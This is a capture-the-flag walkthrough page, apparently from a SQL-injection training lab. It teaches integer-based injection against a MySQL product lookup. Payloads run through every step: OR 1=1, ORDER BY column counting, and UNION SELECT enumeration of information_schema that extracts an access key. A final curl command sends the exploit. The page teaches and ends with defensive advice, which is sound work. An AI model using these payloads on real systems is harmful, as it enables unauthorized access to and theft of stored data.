<h4>Step 1: Confirm Normal Behavior</h4>
<p>
    Enter <code>1</code> in the Product ID field.
    A product should appear, confirming the query works with a normal integer.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Input</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> Wireless Mouse &bull; <strong>Price:</strong> $29.99 &bull; <strong>Category:</strong> Electronics
    </div>
</div>

<h4>Step 2: Test for Integer-Based Injection</h4>
<p>
    Enter <code>1 OR 1=1</code>. Since there are <strong>no quotes</strong> around the input
    in the SQL query (<code>WHERE id = $id</code>), the <code>OR 1=1</code> becomes part of the
    WHERE clause and returns all products. This is the key difference from string injection --
    no quote escaping needed.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Boolean Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1 OR 1=1<br><br>
        <span class="prompt">Query: </span>SELECT name, price, category FROM products WHERE id = 1 OR 1=1<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> Wireless Mouse &bull; <strong>Price:</strong> $29.99 &bull; <strong>Category:</strong> Electronics<br>
        <strong>Name:</strong> USB-C Hub &bull; <strong>Price:</strong> $49.95 &bull; <strong>Category:</strong> Electronics<br>
        <strong>Name:</strong> Mechanical Keyboard &bull; <strong>Price:</strong> $89.00 &bull; <strong>Category:</strong> Electronics<br>
        <strong>Name:</strong> Standing Desk Mat &bull; <strong>Price:</strong> $34.50 &bull; <strong>Category:</strong> Office<br>
        <strong>Name:</strong> LED Desk Lamp &bull; <strong>Price:</strong> $22.75 &bull; <strong>Category:</strong> Office<br>
        <strong>Name:</strong> Noise-Cancelling Headphones &bull; <strong>Price:</strong> $199.99 &bull; <strong>Category:</strong> Audio<br>
        <span class="prompt">Result: </span><strong>All 6 products returned</strong> (instead of just 1) -- injection confirmed!
    </div>
</div>

<h4>Step 3: Determine the Number of Columns</h4>
<p>
    Use <code>ORDER BY</code> to find how many columns the original query returns.
    Increment until you get an error. No quotes needed since we're in an integer context.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Column Count</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1 ORDER BY 3 -- -&nbsp;&nbsp;&nbsp; &#10004; returns Wireless Mouse<br>
        <span class="prompt">Input: </span>1 ORDER BY 4 -- -&nbsp;&nbsp;&nbsp; &#10008; <strong>Unknown column '4' in 'ORDER BY'</strong><br><br>
        <span class="prompt">Result: </span>The query returns <strong>3 columns</strong> (name, price, category).
    </div>
</div>

<h4>Step 4: Discover Hidden Tables</h4>
<p>
    Before extracting data, find what tables exist. Use <code>information_schema.tables</code>
    to enumerate the database.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Table Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>0 UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database() -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> products &bull; <strong>Price:</strong> $ &bull; <strong>Category:</strong><br>
        <strong>Name:</strong> secret_products &bull; <strong>Price:</strong> $ &bull; <strong>Category:</strong>
    </div>
</div>

<p>
    A hidden table called <code>secret_products</code> is revealed!
</p>

<h4>Step 5: Enumerate Columns</h4>
<p>
    Find the column names in the <code>secret_products</code> table.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Column Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>0 UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='secret_products' -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> id &bull; <strong>Price:</strong> $ &bull; <strong>Category:</strong><br>
        <strong>Name:</strong> codename &bull; <strong>Price:</strong> $ &bull; <strong>Category:</strong><br>
        <strong>Name:</strong> access_key &bull; <strong>Price:</strong> $ &bull; <strong>Category:</strong>
    </div>
</div>

<h4>Step 6: Extract the Access Key</h4>
<p>
    Use <code>0</code> as the ID (returns no rows from <code>products</code>) so only
    your UNION results appear. Select <code>codename</code> and <code>access_key</code>
    from the <code>secret_products</code> table.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Extract the Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>0 UNION SELECT codename, access_key, NULL FROM secret_products -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> Project Nightfall &bull; <strong>Price:</strong> $FLAG{int3g3r_inj3ct10n_n0_qu0t3s} &bull; <strong>Category:</strong>
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy <code>FLAG{int3g3r_inj3ct10n_n0_qu0t3s}</code> and paste it into the verification form.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mysql/lab2" \<br> --data-urlencode "id=0 UNION SELECT codename, access_key, NULL FROM secret_products -- -"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Integer-based injection is even easier than string-based
    because you don't need to escape any quotes. The input goes directly into the query
    as <code>WHERE id = $id</code> with no surrounding quotes. Always validate and cast
    numeric inputs (e.g., <code>intval($id)</code>) or use prepared statements.
</div>
